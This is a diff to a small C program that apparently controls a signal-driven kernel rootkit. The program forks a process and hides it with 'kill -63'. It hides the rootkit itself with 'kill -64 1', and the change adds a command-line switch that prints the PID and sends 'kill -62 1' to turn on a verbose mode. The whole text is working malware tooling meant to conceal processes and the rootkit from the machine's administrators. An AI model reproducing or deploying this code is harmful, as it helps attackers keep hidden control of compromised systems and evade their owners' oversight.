@@ -5,7 +5,7 @@
 #include <stdio.h>
 #include <unistd.h>
 
-int main(){
+int main(int argc, char* argv[]){
   char command[100];
   int pid;
 
@@ -19,9 +19,12 @@ int main(){
   }
   else {
     sprintf(command, "kill -63 %i", pid);//Parent process takes PID and hides it
+    if(argc == 2)
     printf("pid is %i\n", pid);//Debugging line
     system(command);
     system("kill -64 1"); //Rootkit goes into hiding
+    if(argc == 2)
+    system("kill -62 1"); //Rootkit activates wordy mode.
   }
   return 0;
 }
